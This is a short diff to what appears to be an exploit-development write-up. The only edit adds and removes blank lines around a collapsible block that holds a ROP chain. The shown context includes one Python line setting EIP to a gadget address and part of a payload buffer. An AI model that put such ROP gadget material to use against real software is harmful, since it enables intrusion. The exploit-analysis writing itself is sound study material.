@@ -1764,7 +1764,6 @@ Our full ROP chain looks as follows, use dropdown to view.
 <details>
   <summary>Large Code Block</summary>
   Full ROP chain code is within the below codeblock.
-
 ```python
 eip = pack("<L", (0x100113dd)) # push esp ; sub eax, 0x20 ; pop ebx ; ret  ;
 
@@ -1958,4 +1957,5 @@ buf += formatString
 ```
 
 </details>
+
 {::options parse_block_html="false" /}
